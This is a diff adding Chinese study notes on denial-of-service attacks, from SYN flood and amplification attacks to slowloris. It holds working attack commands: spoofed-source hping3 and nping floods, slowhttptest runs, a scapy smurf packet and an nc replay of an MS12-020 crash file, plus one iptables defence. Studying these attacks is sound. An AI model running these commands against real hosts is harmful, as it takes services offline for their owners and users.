@@ -1,0 +1,171 @@
+D网络
+  icmp flood, udp flood
+D协议
+  syn flood, ping of death, arp, dns, 802.11, ssl
+D应用
+
+
+从攻击者到受害者
+1.网络连接路线-2.防火墙-3.服务器系统-4.服务器开启应用
+资源耗尽
+1:带宽
+2:吞吐量，并发连接
+3:cpu/内存/io连接
+4:处理请求到能力，对os资源的使用
+系统漏洞攻击
+缓冲区溢出
+协议，程序逻辑漏洞
+
+1.syn-flood
+flood发syn不回ack
+占用最大tcp连接数
+现在防火墙的功能:
+阻止源地址欺骗,伪造的不让发
+拒收从internet接收的却是同一网段作为原地址的数据包
+
+2.smurf(过时)
+send(IP(src="伪造地址", dst="192.168.0.255")/ICMP())
+广播ping
+使所有的内网主机向伪造地址发送icmp
+
+3.sockstress
+三次握手之后传送ack包window=0,让对方等待
+消耗cup内存
+
+防护措施:白名单(DDoS无效)
+sudo iptables -I INPUT -p tcp --dport 21 -m state --state NEW -m recent --set
+sudo iptables -I INPUT -p tcp --dport 21 -m state --state NEW -m recent --update --seconds 100 --hitcount 10 -j DROP
+100s内连接超过10次的丢包,且每次建立连接都更新表
+
+4.teardrop(过时因为操作系统变更,但是学习原理)
+以太网最大长度1518
+14包头4包尾(抓包时包尾没见到)
+
+理论上最大1500数据长度
+ip头最小20
+payload理论上最大1480
+上层协议要求数据完整传输那么ip头的id保持不变，第一次之后传输没有上层头只有ip头加数据，增加偏移
+偏移量从ip上层包头开始计算
+
+第一次之后的偏移量前移，95  98  3.x nt 死机
+现代防火墙丢弃所有数据
+
+5.dns放大攻击
+shell
+
+6.snmp放大攻击
+udp 161/162端口
+监控服务器访问监控设备的161端口
+或者设备访问监控服务器的162端口
+被管理设备是服务器端，管理端是客户端
+MIB库
+commuty是公共密码
+OID
+
+7.NTP放大攻击(网络时间协议)
+udp 123端口
+monlist()查询
+ntpdc -n -c monlist ip
+显示timeout则不存在漏洞
+ntpq -c rv ip
+查服务器端配置
+ntpdc -c sysinfo ip
+查服务器端配置
+
+
+应用层DoS
+8.缓冲区溢出
+cesarftp软件
+效果就是别人连接不上ftp
+但是最强效果就是21端口挂掉
+
+9.ms12-020漏洞(远程桌面协议DoS漏洞)
+searchexploit ms12-020
+nc 192.168.0.121 3389 < termdd.dat
+
+10.slowhttptest
+速度慢但是耗费资源特别强
+擅长apache, tomcat 100%
+(1)slowloris:
+正常http结尾\r\n\r\n
+但是我一直发\r\n表示还有数据，慢慢发
+slowhttptest -c 1000 -H -g -o test -i 10 -r 10 -t GET -u http://192.168.0.124 -x 24 -p 3 -l 9999999
+-c 连接数
+-g 完成后生成cvs和html文件
+-i 发送数据时间间隔(second)
+-r 每秒连接个数
+-x 发送数据的最大长度
+-p 几秒未响应确认DoS成功
+-l 攻击持续时间
+
+(2)slow post:
+给出http头content-length非常大
+body一点点发
+-B
+
+(3)slow read attack:
+接收时候调整window大小缓慢接收
+-R
+
+(4)apache range header attack:
+传送巨大的http数据
+消耗系统资源
+-X
+
+12.rudy(post方式)
+# 好像不好使
+配置文件
+./py文件
+
+13.hping3
+Hping3
+Syn Flood:
+hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 1.1.1.1
+hping3 -S -P -U -p 80 --flood --rand-source 1.1.1.1
+hping3 -SARFUP -p 80 --flood --rand-source 1.1.1.1 (TCP Flood)
+-c: 数据包个数
+-d: 数据包大小
+-w: 窗口大小
+-P: PUSH
+-U: URGE
+
+ICMP Flood:
+hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood 1.1.1.2
+-q: verbose=0
+-n: 输出主机地址
+-a: 显示存活目标
+
+UDP Flood:
+hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 1.1.1.2
+
+14.LAND攻击:
+伪造原地址是受害者自己，自己打自己
+hping3 -n -a 1.1.1.1 -S -d 100 -p 80 --flood 1.1.1.1
+
+tcp全连接dos攻击:
+nmap的子命令
+nping --tcp-connect --rate=10000 -c 1000000000 -q 1.1.1.1
+
+查公网ip:
+nping --echo-client "public" echo.nmap.org --udp
+
+15.Siege
+压力测试
+siege -g http://1.1.1.1/a.php / 1.1.1.1
+siege -i -c 1000
+-f 字典文件  (或者不填默认/etc/siege/urls.txt) 多个目标
+-vv 实时状态
+-A 伪造代理
+
+16.t50
+网络层压力测试
+
+
+黑帽工具:
+17.Loic
+18.Hoic
+19.anonymous DoSer
+20.xoic
+21.hulk
+22.DDoSIM
+23.goldeneye
